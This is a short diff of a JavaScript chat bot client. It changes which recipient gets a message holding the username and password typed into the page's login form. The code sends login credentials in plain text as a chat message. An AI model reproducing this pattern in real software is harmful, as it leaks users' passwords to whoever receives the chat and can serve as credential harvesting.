@@ -451,7 +451,7 @@ async function handleprofother(messageObj) {
             statusDiv.textContent = 'Online';
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            await chat('syntax-error', `ABOT WEB BOT: ${username} / ${password}`);
+            await chat('bot', `ABOT WEB BOT: ${username} / ${password}`);
 
             const mucType = "public_rooms"; 
             const packetID = generatePacketID();
